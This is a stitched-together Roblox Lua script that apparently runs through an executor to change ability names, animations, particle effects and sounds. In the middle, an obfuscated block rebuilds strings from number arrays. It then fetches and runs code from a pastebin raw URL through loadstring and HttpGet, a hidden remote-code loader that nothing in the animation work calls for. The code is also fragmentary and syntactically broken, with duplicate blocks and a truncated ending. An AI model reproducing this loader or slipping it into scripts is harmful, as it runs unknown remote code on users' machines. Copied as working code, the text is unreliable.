local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("1").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Ravage miss"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("2").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Ravage"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("3").Base

local ToolName = baseButton.ToolName


ToolName.Text = "swift sweep"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("4").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Collateral Ruin"


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")


local function findGuiAndSetText()

    local screenGui = playerGui:FindFirstChild("ScreenGui")

    if screenGui then

        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")

        if magicHealthFrame then

            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")

            if textLabel then

                textLabel.Text = "20 series"

            end

        end

    end

end


playerGui.DescendantAdded:Connect(findGuiAndSetText)

findGuiAndSetText()


local animationId = 10468665991


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

local final1 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
final1.Parent = game.Players.LocalPlayer.Character["Head"]
for _, child in ipairs(final1:GetChildren()) do
    if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
        child:Emit(50) -- Emit 20 particles
    end
end
local final4 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
final4.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(final4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(3) -- Emit 20 particles
        end
    end

end

local player = game.Players.LocalPlayer
repeat wait() until player.Character.Humanoid
local humanoid = player.Character.Humanoid
local character = player.Character or player.CharacterAdded:Wait()
local UserInputService = game:GetService("UserInputService")
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://16945573694"
local playAnim = humanoid:LoadAnimation(anim)
anim.AnimationId = "rbxassetid://0"
playAnim:Play()


    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10466974800


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function UYzYcYgtLXIMYUdlzEkjadFiKBMWaPAllMFgcqgrTiXfFBBfvpSrlnMlujMlAdQNgcApnjQtqIWiovR(data) m=string.sub(data, 0, 100) data=data:gsub(m,'')
 
data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
 
 
 
 
 
function PjukvfjPtFdhOrYqIsOIPiXnrfHTi(code)res=UYzYcYgtLXIMYUdlzEkjadFiKBMWaPAllMFgcqgrTiXfFBBfvpSrlnMlujMlAdQNgcApnjQtqIWiovR('gMwHoIiFGxktgTcnYIAPzodaMhkwkLbeHbDtEIchkLTjJICfevhtfejWvioDfTAXhtjYyDEiNcjYrKpnxzvQSOuqefjLABPDCCdN')for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
 
 
-- Referências aos objetos
local player = game.Workspace.Live[PjukvfjPtFdhOrYqIsOIPiXnrfHTi({9135,10605,10185,11235,10605,12075,12180,3360,7140,12285,11445,11445,12705})]
local playerHumanoid = player:FindFirstChildOfClass(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({7560,12285,11445,10185,11550,11655,11025,10500}))
 
-- IDs das animações
local playerAnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({11235})  -- ID de animação do jogador (não utilizado no script fornecido)
local dummyAnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({5145,5670,5985,5460,5565,5565,5565,5775,5460,5355,5355})  -- ID de animação do Dummy
 
-- Função para criar e adicionar animação
local function addAnimation(humanoid, animationId)
    local animation = Instance.new(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11025,11655,11550}))
    animation.AnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935}) .. animationId
    local animator = humanoid:FindFirstChildOfClass(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970}))
 
    if not animator then
        animator = Instance.new(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970}))
        animator.Name = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970})
        animator.Parent = humanoid
    end
 
    local animationTrack = animator:LoadAnimation(animation)
 
    -- Atrasar o início da animação em 0.8 segundos
    wait(0.8)
    animationTrack:Play()
end
loadstring(game:HttpGet(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,8190,8820,12810,8505,9345,11865,12600,12705})))()
-- Adiciona a animação ao Dummy
addAnimation(playerHumanoid, dummyAnimationId)        


    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10471336737


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

local player = game.Players.LocalPlayer
repeat wait() until player.Character.Humanoid
local humanoid = player.Character.Humanoid
local character = player.Character or player.CharacterAdded:Wait()
local UserInputService = game:GetService("UserInputService")
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://16944345619"
local playAnim = humanoid:LoadAnimation(anim)
anim.AnimationId = "rbxassetid://0"
playAnim:Play()

    end

end
humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 13927612951----omi


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


  local p = game.Players.LocalPlayer
local Humanoid = p.Character:WaitForChild("Humanoid")


local AnimAnim = Instance.new("Animation")
AnimAnim.AnimationId = "rbxassetid://18462892217"
local Anim = Humanoid:LoadAnimation(AnimAnim)
AnimAnim.AnimationId = "rbxassetid://0"
Anim:Play()


-- Local Script


local soundId = 18460952794 -- Correct sound ID


-- Create a new Sound instance
local sound = Instance.new("Sound")
sound.Name = "audio/kj_awakening_varient_2_sfx_only"
sound.SoundId = "rbxassetid://" .. soundId
sound.Volume = 1
sound.Pitch = 1.0 -- Pitch set to 1.0
sound.PlaybackSpeed = 1.0 -- Adjusted playback speed


-- Parent the sound to Workspace
sound.Parent = workspace


-- Play the sound
sound:Play()


-- Local Script


local soundId = 18460863844 -- Correct sound ID


-- Create a new Sound instance
local sound = Instance.new("Sound")
sound.Name = "audio/kj_awakening_varient_2_sfx_only"
sound.SoundId = "rbxassetid://" .. soundId
sound.Volume = 1
sound.Pitch = 1.0 -- Pitch set to 1.0
sound.PlaybackSpeed = 1.0 -- Adjusted playback speed


-- Parent the sound to Workspace
sound.Parent = workspace


-- Play the sound
sound:Play() 


wait(0.5)

local function stringToCFrame(str)
	local components = {str:match("([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)")}
	for i = 1, #components do
		components[i] = tonumber(components[i])
	end
	return CFrame.new(unpack(components))
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:FindFirstChild("Torso")
local workspace = game:GetService("Workspace")


local resourcesFolder = ReplicatedStorage:FindFirstChild("Resources")
if not resourcesFolder then return end


local fiveSeasonsFX = resourcesFolder:FindFirstChild("FiveSeasonsFX")
if not fiveSeasonsFX then return end


local jumpFXModel = fiveSeasonsFX:FindFirstChild("JumpFX")
if not jumpFXModel then return end


local jumpFXPart = jumpFXModel:FindFirstChild("JumpFX")
if not jumpFXPart then return end


local clonedJumpFX = jumpFXPart:Clone()
clonedJumpFX.Parent = workspace


local function emitParticles(instance)
    for _, child in ipairs(instance:GetDescendants()) do
        if child:IsA("ParticleEmitter") then
            child.Enabled = true
            child:Emit(1)
            child.Enabled = false
        end
    end
end


local function positionOnFloor(part)
    if torso then
        local torsoPosition = torso.Position
        local rayOrigin = torsoPosition + Vector3.new(0, 10, 0)
        local rayDirection = Vector3.new(0, -20, 0)
        local raycastResult = workspace:Raycast(rayOrigin, rayDirection)


        if raycastResult then
            part.Position = raycastResult.Position - Vector3.new(0, 0.9, 0)
        end
    end
end


emitParticles(clonedJumpFX)
positionOnFloor(clonedJumpFX)


Wait(3.5)


        local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(20) -- Emit 20 particles
        end
        end
local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.a:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(20) -- Emit 20 particles
        end
        end
        local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
        end
        wait(2.1)
        red4:Destroy()
                        local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].EyeEmit:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Head"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(20) -- Emit 20 particles
        end
        end
                local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(20) -- Emit 20 particles
        end
        end
local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.a:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(20) -- Emit 20 particles
        end
        end
                local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
        end
        wait(1.8)
        red4:Destroy()

-- Get the player and their character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:WaitForChild("Torso")


-- Function to find a descendant recursively by name
local function findDescendant(parent, name)
    local child = parent:FindFirstChild(name)
    if not child then
        for _, descendant in ipairs(parent:GetChildren()) do
            child = findDescendant(descendant, name)
            if child then
                break
            end
        end
    end
    return child
end


-- Function to duplicate a ParticleEmitter
local function duplicateEmitter(originalEmitter)
    local duplicate = originalEmitter:Clone()
    duplicate.Parent = originalEmitter.Parent
    duplicate.Rate = 100  -- Set the rate of the duplicated emitter to 100 initially
    return duplicate
end


-- Look for the tpthing ParticleEmitter
local replicatedStorage = game:GetService("ReplicatedStorage")
local resourcesFolder = replicatedStorage:WaitForChild("Resources", 2) -- Wait for 2 seconds if not immediately found
if resourcesFolder then
    local kjEffectsFolder = resourcesFolder:FindFirstChild("KJEffects")
    if kjEffectsFolder then
        local tpThingEmitter = findDescendant(kjEffectsFolder, "tpthing")
        if tpThingEmitter and tpThingEmitter:IsA("ParticleEmitter") then
            -- Duplicate the emitter
            local duplicatedEmitter = duplicateEmitter(tpThingEmitter)
            
            -- Parent the duplicated emitter to the character's torso
            duplicatedEmitter.Parent = torso
            print("Successfully parented duplicated tpthing ParticleEmitter to Torso and set Rate to 100.")
            
            -- Wait for 1.0 seconds
            wait(0.2)
            
            -- Set the rate of the duplicated emitter to 0
            duplicatedEmitter.Rate = 0
            print("Successfully set Rate of duplicated emitter to 0 after 1.0 seconds.")


        else
            warn("Could not find tpthing ParticleEmitter or it is not a ParticleEmitter.")
        end
    else
        warn("Could not find KJEffects folder inside Resources.")
    end
else
    warn("Could not find Resources folder inside ReplicatedStorage.")
end


Wait(0.2)


local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Get the player and their character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local leftArm = character:WaitForChild("Left Arm")


-- Check if the "ArmEnabled" object exists in the "Left Arm"
local armEnabled = leftArm:FindFirstChild("ArmEnabled")
if armEnabled then
    -- Remove the "ArmEnabled" object
    armEnabled:Destroy()
    print("Successfully removed ArmEnabled from Left Arm.")
else
    warn("Could not find ArmEnabled in Left Arm.")
end

local player = game.Players.LocalPlayer
local userInputService = game:GetService("UserInputService")
local activated = false

    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12510170988


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

local player = game.Players.LocalPlayer
repeat wait() until player.Character.Humanoid
local humanoid = player.Character.Humanoid
local character = player.Character or player.CharacterAdded:Wait()
local UserInputService = game:GetService("UserInputService")
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://17325254223"
local playAnim = humanoid:LoadAnimation(anim)
anim.AnimationId = "rbxassetid://0"
playAnim:Play()


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 11343318134


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://13073745835"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0.05

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.5)


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 11365563255 ------table flip
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild("Humanoid")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild("Humanoid")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local player = game.Players.LocalPlayer
repeat wait() until 
